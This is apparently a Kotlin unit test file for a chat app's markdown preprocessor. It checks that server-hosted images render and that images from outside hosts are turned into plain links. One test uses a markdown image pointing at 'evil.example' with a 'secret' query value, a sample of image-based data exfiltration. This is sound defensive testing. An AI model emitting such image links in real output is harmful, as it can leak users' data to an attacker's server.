package io.mszymanski.orknux.mobile.chat

import org.junit.Assert.assertEquals
import org.junit.Test

class MarkdownPrepTest {
    private val base = "https://orknux.example.com"
    private fun prep(text: String) = MarkdownPrep.prepare(text, base)

    @Test
    fun aPictureTheServerHoldsIsDrawn() {
        assertEquals("![cat]($base/api/attachments/4)", prep("![cat](/api/attachments/4)"))
        assertEquals("![cat]($base/a.png)", prep("![cat]($base/a.png)"))
    }

    @Test
    fun aPictureFromElsewhereIsNeverFetched() {
        assertEquals("[Picture](https://evil.example/?q=secret)", prep("![](https://evil.example/?q=secret)"))
        assertEquals("[cat](https://evil.example/c.png)", prep("![cat](https://evil.example/c.png)"))
    }

    @Test
    fun aLinkIntoTheInstallationOpensOnIt() {
        assertEquals("[run]($base/runs/4)", prep("[run](/runs/4)"))
        assertEquals("[site](https://x.example)", prep("[site](https://x.example)"))
    }

    @Test
    fun codeIsLeftAlone() {
        val code = "```\n![](/a.png)\n```"
        assertEquals(code, prep(code))
    }
}
